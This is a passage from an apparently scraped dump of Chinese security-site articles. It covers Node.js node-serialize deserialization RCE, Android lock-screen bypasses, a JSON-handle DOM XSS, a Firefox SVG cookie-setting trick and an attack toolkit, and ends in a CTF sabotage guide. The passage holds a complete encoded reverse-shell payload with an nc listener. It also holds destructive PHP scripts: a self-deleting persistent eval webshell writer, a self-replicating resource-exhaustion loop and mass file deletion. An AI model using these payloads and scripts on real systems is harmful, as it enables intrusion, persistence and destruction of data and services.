var obj = serialize.unserialize(str);   if (obj.username) {     res.send(""Hello "" + escape(obj.username));   } } else {     res.cookie('profile', ""eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0="", {       maxAge: 900000,       httpOnly: true     }); } res.send(""Hello World"");});app.listen(3000);  Java，PHP，Ruby 和 Python 都出现过很多次反序列化的漏洞。下面是这些问题的相关资源：Understanding PHP Object InjectionJava Deserialization Cheat SheetRails Remote Code Execution Vulnerability ExplainedArbitrary code execution with Python pickles但是我找不到任何关于 Node.js 中反序列号/对象注入的资源，于是我就想对此进行研究，然后我花了点儿时间成功利用此 bug，实现了任意代码注入。构建 Payload我使用了 0.0.4 版本的 node-serialize 进行研究，成功利用的话，不可信输入传递到 unserialize() 的时候可以执行任意代码。创建 payload 最好使用同一模块的 serialize() 函数。我创建了以下 JavaScript 对象，将其传入 serialize() 函数。var y = {   rce : function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); },}var serialize = require('node-serialize');  console.log(""Serialized: \n"" + serialize.serialize(y));  我们得到以下输出：现在我们得到序列化的字符串，可以用 unserialize() 函数进行反序列化操作。那么问题来了，怎么代码执行呢？只有触发对象的 rce 成员函数才行。后来我想到可以使用 JavaScript 的立即调用的函数表达式（IIFE）来调用该函数。如果我们在函数后使用 IIFE 括号 () ，在对象被创建时，函数就会马上被调用。有点类似于 C 中的类构造函数。现在修改过的代码经 serialize() 函数马上会被调用。IIFE 运行良好，但序列化失败了。于是我试着在之前序列化的字符串中函数体后面加上括号 ()，并将其传入 unserialize() 函数，很幸运，成功执行。那么就有了下面的 exploit：{""rce"":""_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()""}  将其传入 unserialize() 函数，触发代码执行。var serialize = require('node-serialize');  var payload = '{""rce"":""_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()""}';  serialize.unserialize(payload);  进一步利用现在我们知道了，如果不受信任的数据传入其中，我们利用 node-serialize 模块中的 unserialize() 函数。我们来利用 Web 程序中的漏洞反弹一个 shell 出来吧。这里我使用 nodejsshell.py 生成反向 shell 的 payload。$ python nodejsshell.py 127.0.0.1 1337[+] LHOST = 127.0.0.1[+] LPORT = 1337[+] Encodingeval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))  现在我们生成反序列化的 payload，并在函数后面添加 IIFE 括号 ()。{""rce"":""_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()""}我们同样要进行 Base64 编码，然后在 Cookie 头中加入 Payload，向服务器发送请求。然后开端口监听 shell 即可。nc -l 127.0.0.1 1337  然后我们就有了一个反弹 shell！原作者提供的演示视频：https://youtu.be/GFacPoWOcw0总结我们利用了反序列化的漏洞，配合不受信任的用户输入实现任意代码执行。经验就是不要信任用户输入。而该漏洞的根本原因就是它在反序列化内部使用了 eval() 。我在另一个名为 serialize-to-js 的模块中也发现了类似的漏洞。在该模块中，Node.js 中的 require() 函数在使用 IIFE 反序列化对象的过程中没有作用域，并且在它内部使用了 new Function() 进行序列号。我们仍可以使用略复杂的 payload 来实现代码执行。补充内容（译者注）：上面是翻译内容，关于本漏洞，我说几点。立即调用的函数表达式（IIFE）在Javascript中，一对圆括号()是一种运算符，跟在函数名之后，表示调用该函数。比如，print()就表示调用print函数。有时，我们需要在定义函数之后，立即调用该函数。这时，你不能在函数的定义之后加上圆括号，这会产生语法错误。产生这个错误的原因是，function这个关键字即可以当作语句，也可以当作表达式。为了避免歧义，规定 function 关键字出现在行首时，解释为语句。因此 IIFE 一般写成下面的形式：(function(){ /* code */ }());// 或者(function(){ /* code */ })();而漏洞代码位于 serialize.js 75 行附近：主要是 eval 这一句：eval('(' + obj[key].substring(FUNCFLAG.length) + ')')  而代码执行恰好就是 eval 中的这俩括号构成 IIFE。通过 GitHub 搜索，可以看到该模块被不少项目使用：如果不信任的输入能够进入 unserialize() 函数，就很有可能存在此漏洞风险。无脑 npm install 固然方便，但模块安全性并不可知，这也是 npm 带来方便的同时，可能存在的风险吧。还有一点是 eval() 函数。这算是一危险函数，一般涉及到用户交互数据的代码，不建议开发者使用此函数，因为未受信任的数据很可能通过它进入到代码上下文当中，带来很大的潜在风险。如果场景需要涉及到执行数据，可以使用 Node.js 的 vm 隔离出上下文。参考示例代码，可以使用 script.runInNewContext([sandbox]) 等接口，自定义 sandbox 作为全局对象运行脚本代码，并返回结果，这样全局变量会受到沙箱限制。比如另一个序列化模块 funcster ，下图是部分代码，它将反序列化的函数运行于新的沙箱之中。","2017-02-11 16:26:55","Web安全","利用 Node.js 反序列化漏洞远程执行代码","http://nsoad.com/Article/web/20170211/1058.html"
"5ccbf9fe4f2f0a0a7a69bff8","为了避免手机中一些重要的隐私信息，被其他人获取或访问到，例如：短信、通讯录、照片等内容。","kong","为了避免手机中一些重要的隐私信息，被其他人获取或访问到，例如：短信、通讯录、照片等内容。我们通常都会设置锁屏，来保护我们的手机。而在 Android智能机中，最常用的安全措施是模式锁定，PIN码或数字密码锁屏。但是，如果你不小心忘记了你所设置的模式 PIN 或密码的话，那又该怎么办呢？其实，你大可不必担心这个问题。因为在设计之初， Android 就已经考虑到了这个问题，并为用户提供了几种不同的方法来绕过锁屏。但遗憾的是，这些方法没有一种是适用于所有设备的！下面我将给出七种目前最有效的方法，希望能解决你的问题！方法1：使用Android设备管理器（ADM）对于版本较新的 Android 智能机或平板电脑，使用 Android 设备管理器来绕过锁屏，是最佳选择。你可以通过 Google 账户，来 登陆 Android 设备管理器。（这里对登陆所使用的设备没有要求，你可以使用任意一台设备或电脑来登陆该服务！） 一旦 ADM 在你的设备上获得修复，接下来我们点击“锁定”按钮。 如果服务在查找你设备时遇到问题，我们可以多刷新几次浏览器，如果你的手机兼容，应该会在 5 次左右 尝试后取得连接。在单击“锁定”按钮后，系统将提示您输入新密码。 这将重置你之前所设置的锁屏密码。在两次确定新密码无误后，我们点击“锁定”按钮即可 。密码重置，大概需要五分钟左右的时间。重置完成后，你就可以使用新密码来登陆设备了！方法2：使用三星的“Find My Mobile”服务如果你使用的是三星智能机，那么你可以通过设备自带的，一个叫 “Find My Mobile（找回手机）”的服务 来完成锁屏绕过。这个服务功能类似于 ADM ，同样你可以使用任意设备通过浏览器，使用三星的账户来登陆该服务。但是这里大家需要注意一点，如果你之前没有设置过三星账户，那么这个方法将没有任何作用！此外，你还需要记住一些运营商像 Sprint，锁定这项服务。在你 Samsung 帐户登录后，我们选择左侧栏中的 “Lock my screen（锁定我的屏幕）” 按钮。 并在右侧的第一个输入框中，输入新的 PIN 码。然后点击屏幕底部的 “Lock（锁定）” 按钮。 这里大概需要等待一两分钟时间，设置成功后你就可以使用该 PIN码 来解锁设备了！方法3：使用“忘记模式”功能如果你的设备当前运行的是 Android 4.4 或 更低版本，那么你可以尝试 “Forgot Pattern（忘记模式）” 功能来重置锁屏密码。当你超过 5 次尝试解锁失败后，你会看到一条提示信息，“请在 30 秒后重试”。这时你会看到屏幕底部有显示 “Forgot Pattern（忘记模式）” 的按钮，我们来点击该按钮。选择“进入 Google  帐户详情”（你也可以直接转到此选项，具体取决于你的设备），然后输入你的 Gmail 帐户和 密码。Google 会向你发送带有解锁图案的电子邮件，你可以随时进行更改。方法4：恢复出厂设置如果你并不在乎手机上存储的数据信息，那么 “恢复出厂设置” 这个选项，无疑能为你解决大部分问题。它类似于我们平时的系统重装，会一次性清除你手机上所有的存储内容。 根据你的设备类型，操作过程也略有不同。但是，大多数手机即使你的手机完全处于关闭或无法开机的状态，也能做这个操作！在关机状态下，我们同时按住音量减键和电源键。此时我们将进入 Android 的 启动程序菜单。按两次音量减键，高亮显示“恢复模式”选项，然后按电源键选中该项。 接下来，我们同时按住音量加键和电源键进入到“恢复模式”。 然后，使用音量键来高亮显示 “擦除数据/恢复出厂设置” 这个选项，最后按电源键选中该项。当我们成功执行完以上操作后，我们通过音量键选中最上面的 系统重启选项，来重启我们的手机。此时你会发现，我们手机的锁屏已经消失了！ 方法5：使用 ADB 删除密码文件如果你之前已经在你的手机上启用了 USB 调试功能，并且允许你所使用的计算机通过 ADB 连接。那么，你就可以非常轻松地解锁你的设备！ 首先，我们使用 USB 数据线将手机连接到计算机。然后，在 ADB 安装目录中打开命令提示符。键入以下命令，然后按 Enter 键。接下来，我们重启我们的手机，你会发现锁屏消失了，并且也能正常的访问我们的手机了！ 但请注意，这只是暂时的。 因此，在你下次重启之前，请确保已经为手机设置了新的模式，PIN 或 密码。方法6：引导到 安全模式 以绕过第三方锁屏如果你当前使用的手机锁屏，不是官方自带的，而是使用了第三方的锁屏软件。那么启动进入 安全模式 是最简单的绕过锁屏的方法。大多数手机可以从锁屏中调出电源菜单，然后长按“关机”选项。此时，系统会询问你是否要启动进入安全模式，我们选择“确定”，之后你的第三方锁屏程序将会被暂停使用。 接下来，你只需将手机上的第三方锁屏应用程序的数据清除或将其卸载就行了。然后重启我们的手机即可！ 这样，你就彻底解决了你的锁屏问题。方法7：使锁屏 UI 崩溃如果，你的设备当前运行的 Android 版本为 Android 5.0-5.1.1 ，你可以尝试使用这种方法来绕过锁屏。这种方法非常的简单，同时也很意思。首先，我们点击锁屏界面上的“紧急呼叫”选项。然后在拨号界面连续输入 10 个星号，接着我们双击选中这 10 个星号，并“复制”它们。通过粘贴选项，我们将复制的这 10 个星号，反复粘贴到输入框内，直到双击输入框不再高亮显示字符为止！接下来，我们返回到锁屏界面，并打开相机快捷方式。拉下通知栏，然后点击设置图标，系统将提示你输入密码。 长按输入字段并选择“粘贴”，然后重复此过程多次。最后，当你将足够的字符粘贴到字段中后，你的锁屏 UI 将会崩溃，这时你就可以成功访问到手机的其它界面了！","2016-12-28 21:17:26","移动安全","七种方法绕过安卓手机锁屏","http://nsoad.com/Article/MobileSecurity/20161228/948.html"
"5ccbf9fe4f2f0a0a7a69bff9","刚好距上次发表 ChromeJsonView 的【问题】半年时间，这次简单描述下 Firefox 浏览器中 JsonHandle 最新版存在的安全缺陷。","kong","[+] Author: evi1m0#sec.ly.com[+] Team: n0tr00t security team[+] From: http://www.n0tr00t.com[+] Create: 2016-11-29JSON-handle oJsonCheck.oError获取：https://addons.mozilla.org/en-US/firefox/addon/json-handle/reviews/It's a browser and editor for JSON document.You can get a beautiful view.对JSON格式的内容进行浏览和编辑，以树形图样式展现JSON文档，并可实时编辑。刚好距上次发表 ChromeJsonView 的【问题】半年时间，这次简单描述下 Firefox 浏览器中 JsonHandle 最新版存在的安全缺陷，用户在转换 JSON 失败时，由于过滤不严谨导致 DOM 解析错误代码时触发攻击者构造的 JavaScript 代码：resource://jsonhandle-at-gmail-dot-com/data/JSON-handle/js/jsonH.js    ""showErrorTips"" : function (sJson) {        var oJsonCheck = oLineCode(sJson);        if(oJsonCheck.oError) {            var s = _pri.oLang.getStr('msg_4') + _pri.oLang.getStr('msg_5', oJsonCheck.oError.line+1) + ' : ' + '&lt;span id=""errorTarget""&gt;'+oJsonCheck.oError.lineText+'&lt;/span&gt;';            $('#tipsBox').html(s);            _pri[""holdErrorTips""] = false;        }else{            //alert('ok');        }        $('#errorCode').html(oJsonCheck.dom);追踪变量 oJsonCheck.oError.lineText, var oJsonCheck = oLineCode(sJson);, _pri[""insertErrorFlag""] ：resource://jsonhandle-at-gmail-dot-com/data/JSON-handle/js/jsonlint.js    var oLineCode = (function() {        var _pub_static = function() {            var _pri = {},            _pub = {};            var _init = function(sJson) {                sJson = _pri.fixReturnline(sJson);                sJson = _pri.insertErrorFlag(sJson);                sJson = _pri.escape(sJson);                sJson = sJson.replace('@鈼�$#errorEm#$鈼咢', '&lt;span class=""errorEm""&gt;').replace('@鈼�$#/errorEm#$鈼咢', '&lt;/span&gt;');                sJson = '&lt;ol&gt;&lt;li&gt;&lt;div&gt;' + sJson.split('\n').join('&lt;/div&gt;&lt;/li&gt;&lt;li&gt;&lt;div&gt;') + '&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;'_pub[""dom""] = $('&lt;div class=""line-code""&gt;' + sJson + '&lt;/div&gt;');            };            _pri[""fixReturnline""] = function(s) {                return s.replace(/\r\n/g, '\n').replace(/\r/g, '\n');            };            _pri[""insertErrorFlag""] = function(s) {                var aLine = s.split('\n');                jsonlint.yy.parseError = function(sError, oError) {                    var sLine = aLine[oError.line];                    //console.log(sError, oError);                    _pub.oError = oError;                    aLine[oError.line] = sLine.slice(0, oError.pos) + '@鈼�$#errorEm#$鈼咢' + sLine.slice(oError.pos) + '@鈼�$#/errorEm#$鈼咢';                };                try {                    jsonlint.parse(s);                } catch(e) {                    _pri[""hasError""] = true;                }                return aLine.join('\n');            };            _pri[""escape""] = function(s) {                s = s || '';                return s.replace(/\&amp;/g, '&amp;amp;').replace(/\&lt;/g, '&amp;lt;').replace(/\&gt;/g, '&amp;gt;').replace(/\""/g, '&amp;quot;').replace(/ /g, '&amp;nbsp;');            };            _init.apply(_pub, arguments);            return _pub;        };        return _pub_static;    } ());_pri[""insertErrorFlag""]:    var aLine = s.split('\n');    jsonlint.yy.parseError = function(sError, oError) {        var sLine = aLine[oError.line];        //console.log(sError, oError);        _pub.oError = oError;        aLine[oError.line] = sLine.slice(0, oError.pos) + '@鈼�$#errorEm#$鈼咢' + sLine.slice(oError.pos) + '@鈼�$#/errorEm#$鈼咢';根据上面的代码缺陷我们可以构造一个报错的 JSON 格式 ：{""Success"":true,""Message"":""success"",""Code"":200,""ReturnValue"":[{""FromCityName"":""宜昌"",""FromCityId"":197,""FromCityPy"":"""",""BatchNo"":""318_y5abL0_FB_6_3_9"",""LineProperty"":"""",""ProjectType"":7,""ProductId"":115590,""Title"":""【南昌往返】【双动往返】【黄金系列】长江三峡宜昌-重庆5晚6日游"",""SubTitle"":""邮轮"",""Price"":3200.00,""ProductUrl"":""http://www.ly.com/youlun/tours-115590.html#Resys=318_y5abL0_FB_6_3_9"",""ProductImgUrl"":""http://pic3.40017.cn/c_420x272_001111111.jpg""&lt;script&gt;prompt`a1`//"",""RedTab"":""""},]}不过想要加载外域 JS 进一步利用还有一个小坑在里面，我们通过断点调试可以看到 sJson, LineText, s 的值分别为：- ….c_420x272_001111111.jpg""&lt;script&gt;payload:01234567899876543210//"",""RedTab"":""""}- ...0x272_001111111.jpg""&lt;script&gt;payload:0123- JSON format error@line 1 : &lt;span id=""errorTarget""&gt;...0x272_001111111.jpg""&lt;script&gt;payload:0123&lt;/span&gt;这是由于代码中的 upcomingInput 对长度进行了限制，但这不影响我们依然可以利用一些技巧来实施攻击：resource://jsonhandle-at-gmail-dot-com/data/JSON-handle/js/jsonlint.js    upcomingInput:function () {            var next = this.match;            if (next.length &lt; 20) {                next += this._input.substr(0, 20-next.length);            }            var s = (next.substr(0,20)+(next.length &gt; 20 ? '...':'')).replace(/\n/g, """");            return s;        }VulnTimelineFind the vulnerability. - 2016/11/25 13:00Report jsonhandle#gmail.com - 2016/11/27 12:10Write the Paper, via @evi1m0. - 2016/11/29 00:00","2016-11-30 12:23:55","Web安全","JSON-handle DomXSS Vulnerability","http://nsoad.com/Article/web/20161130/872.html"
"5ccbf9fe4f2f0a0a7a69bffa","我最近有了解到，浏览器允许使用 meta 标签来设置 cookie 。我不确定我是不是忘了这一特性，或者之前从来没使用过它。","kong","SVG - 通过 img 标签设置跨域 cookie我最近有了解到，浏览器允许使用 meta 标签来设置 cookie 。我不确定我是不是忘了这一特性，或者之前从来没使用过它。鉴于之前研究过 SVG ，我决定试一下。SVG 的标准不包括 meta 标签，但它支持 foreignobject 标签。&lt;foreignObject&gt; 中的SVG元素允许包含外部 XML 命名空间，该命名空间的图形内容由不同的 user agent 绘制。来自 mdn 的一个简单例子展示了如何在 SVG 文件中使用 XHTML 命名空间。&lt;foreignObject width=""100"" height=""50""  requiredExtensions=""http://www.w3.org/1999/xhtml""&gt;  &lt;!-- XHTML content goes here --&gt;        &lt;body xmlns=""http://www.w3.org/1999/xhtml""&gt;        &lt;p&gt;Here is a paragraph that requires word wrap&lt;/p&gt;      &lt;/body&gt;&lt;/foreignObject&gt;  设置 cookie我修改了以下示例代码，并将浏览器指向下面的 SVG：&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;  &lt;circle r='100'&gt;  &lt;/circle&gt;  &lt;foreignObject&gt;  &lt;html xmlns='http://www.w3.org/1999/xhtml'&gt;  &lt;meta http-equiv='Set-Cookie' content='ppp=qqq' /&gt;  &lt;/html&gt;  &lt;/foreignObject&gt;  &lt;/svg&gt;  宿主域现在有一个 cookie ppp=qqq。下一步便是尝试一下了，如果另一个域在加载此 SVG 文件的话，将会发生什么呢：// Domain: http://example.com&lt;!DOCTYPE html&gt;  &lt;body&gt;  &lt;img src=""http://attacker.com/cookie.svg""&gt;  &lt;/body&gt;  通过 meta 设置cookie很遗憾，cookie 被设置为 attack.com ，而不是 example.com 。重定向 + data uri使它生效的最后一个技巧是使用 data: 协议处理程序和重定向。假设 example.com 域有以下代码。&lt;!DOCTYPE html&gt;  &lt;body&gt;  &lt;img src=""http://attacker.com/cookie""&gt;  &lt;/body&gt;  attacker.com 的服务器返回以下响应代码：HTTP 302 Found  Location: data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;circle r='100'&gt;&lt;/circle&gt;&lt;foreignObject&gt;&lt;html xmlns='http://www.w3.org/1999/xhtml'&gt;&lt;meta http-equiv='Set-Cookie' content='ppp=qqq' /&gt;&lt;/html&gt;&lt;/foreignObject&gt;&lt;/svg&gt;  注：如 php 可以使用以下代码：header(""Location: data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;circle r='100'&gt;&lt;/circle&gt;&lt;foreignObject&gt;&lt;html xmlns='http://www.w3.org/1999/xhtml'&gt;&lt;meta http-equiv='Set-Cookie' content='svg2=2222qqq' /&gt;&lt;/html&gt;&lt;/foreignObject&gt;&lt;/svg&gt;"");  利用 data: 为宿主域设置 cookie一旦我在 Firefox 浏览器中打开此测试用例，就会为 example.com 设置一个 Cookie 。这会为网页带来许多不同的漏洞，包括允许包含来自外部/第三方网站的图像。在通过 firefox 团队调查这个问题期间，出现了另一个问题，公开后即可直接阅读：https://bugzilla.mozilla.org/show_bug.cgi?id=1317641#c20目前还在确定该 bug 的奖励。我必须感谢我的 Cure53 小伙伴，帮助我研究此漏洞（特别是 Masato）","2016-12-10 13:13:29","Web安全","Firefox - SVG cross domain cookie vulnerability","http://nsoad.com/Article/web/20161210/909.html"
"5ccbf9fe4f2f0a0a7a69bffb","这是一款用 Python 写的安全工具集。软件封装于“模块”中。模块主要由纯 Python 代码和第三方程序组成。","silence","大规模杀伤性武器（Weapon of Mass Destruction）这是一款用 Python 写的安全工具集。软件封装于“模块”中。模块主要由纯 Python 代码和第三方程序组成。主要功能1) 要使用模块，运行命令 ""use [module_call]""，例如使用 ""use apsniff"" 激活模块。 2) 可以使用 ""set [parameter] [value]"" 更改模块选项。 3) 在模块内，可以用命令 ""so"" 查看选项。 4) 环境设置位于 core/config.ini 中。请在运行程序之前进行调整。截屏： Web 界面控制台运行命令“www”，激活 Flask 服务，即可在浏览器中展示模块。通过 127.0.0.1:5000 访问。模块会直接加载到 xterm 中。DEV: 可以试一下 SniffHTTP 和 APsniff 模块 - 可在浏览器中定义参数。Screenshot: 模块列表运行运行前： 1. 调整core/config.ini.default 中的环境选项。 2. 将 core/config.ini.default 重命名为 core/config.ini。开启终端: python3 wmd.py使用单独的模块: python3 wmd.py -m [CALL]开启 web 服务: python3 wmd.py -w不检查依赖运行: python3 wmd.py -nc环境要求:Linux 系统Python3Python 库的要求位于 requirements.txt可选项 tools/software/GIT:这些模块需要时会通知你，并不会直接运行GIT: Admin-FinderAircrack-ngAiromon-ngAirodump-ngAirolib-ngArpArpspoofBeefBettercapGIT: changemeCrackMapExecCreate_apDigDnsmapGIT: DnsreconGIT: ExploitdbGIT: HashidHostapdGIT: InstabotJohn the RipperNmapGIT: RoutersploitSPARTAGIT: SpoofcheckGIT: XSSER部署项目结构core --&gt; 核心文件中使用了所有的代码。files --&gt; 静态文件，密码列表等。logs --&gt; 用于保存日志的标准文件夹。modules --&gt; 包括各种模块。tmp --&gt; 你猜呢tools --&gt; GIT 工具。www --&gt; webserver 的文件。新模块可以在 modules/module_template.py 中检查模板。添加模块Run python3 wmd.py -a modulePathName.py","2017-02-15 00:09:58","安全工具","WMD - Python 模块化安全工具集","http://nsoad.com/Security-tools/20170215/tools-1059.html"
"5ccbf9fe4f2f0a0a7a69bffc","0&times;00 前言不能搅”shi”的CTF不是好CTF，不能搅”shi”的题目不是好题目。我很赞成phithon神的一句话，“比赛就是和他人竞争的过程，通过各","Kong","0×00 前言不能搅”shi”的CTF不是好CTF，不能搅”shi”的题目不是好题目。我很赞成phithon神的一句话，“比赛就是和他人竞争的过程，通过各种手段阻止对手拿分我觉得也是一种能力。”你能够做到别人做不到的，那就是你的本事。本文所说的搅屎是在GETSHELL的情况下才能进行的！！！遇到phithon师傅的《CTF主办方指南之对抗搅屎棍》就GG了0×01 预备知识大多数能够搅屎的题目基本上是PHP且需要getshell的。所以，必备的PHP语法基本只是必须要懂~接下来是介绍一些特殊的PHP内置函数ignore_user_abort()设置客户端断开连接时是否中断脚本的执行PHP以命令行脚本执行时，当脚本终端结束，脚本不会被立即中止，除非设置 value 为 TRUE，否则脚本输出任意字符时会被中止。ignore_user_abort(1);set_time_limit()设置脚本最大执行时间设置允许脚本运行的时间，单位为秒。如果超过了此设置，脚本返回一个致命的错误。默认值为30秒，或者是在php.ini的max_execution_time被定义的值，如果此值存在。set_time_limit(0);ini_get()获取一个配置选项的值成功时返回配置选项的值。echo 'disable_functions='.ini_get('disable_functions');file_put_contents()将一个字符串写入文件和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。file_put_contents($filename, $content);file_get_contents()将整个文件读入一个字符串和 file() 一样，只除了 file_get_contents() 把文件读入一个字符串。将在参数 offset 所指定的位置开始读取长度为 maxlen 的内容。如果失败，file_get_contents() 将返回 FALSE。当然这个函数也可以通过其他协议读取文件内容file_get_contents($filename);file_get_contents($url);file_put_contents()将一个字符串写入文件和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。file_put_contents($filename, $content);unlink()删除文件删除 filename。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 E_WARNING 级别的错误。unlink($filename);给你的PHP脚本加上set_time_limit(0);ignore_user_abort(1);这两句就能够做的常驻内存了。对待这种情况，基本上只能重启PHP了。0×02 搅屎之不死鸟no_die_shell.php&lt;?php    set_time_limit(0);    ignore_user_abort(1);    unlink(__FILE__);    //file_put_contents(__FILE__,'');    while(1){        file_put_contents('path/webshell.php','&lt;?php @eval($_POST[""password""]);?&gt;');    }?&gt;首先就是删除自己，不让别人知道，然后在某一个目录下循环生成你的webshell，根本删不掉~~0×03 搅屎之核弹nuclear_bomb.php&lt;?php    set_time_limit(0);    ignore_user_abort(true);    while(1){        file_put_contents(randstr().'.php',file_get_content(__FILE__));        file_get_contents(""http://127.0.0.1/"");    }?&gt;根据代码，不难看出这个脚本的功能。常驻内存之后，进入死循环。循环内部是实现无效複製自身并且访问web服务的功能。执行的后果就是内存爆炸，php就GG了，严重点的话，Docker也GG。0×04 搅屎之你死我活del.php&lt;?php    set_time_limit(0);    ignore_user_abort(1);    array_map('unlink', glob(""some/dir/*.php""));?&gt;del_or_change.php&lt;?php    set_time_limit(0);    ignore_user_abort(1);    unlink(__FILE__);    function getfiles($path){        foreach(glob($path) as $afile){            if(is_dir($afile))                getfiles($afile.'/*.php');            else                @file_put_contents($afile,""#Anything#"");                //unlink($afile);        }    }    while(1){        getfiles(__DIR__);        sleep(10);    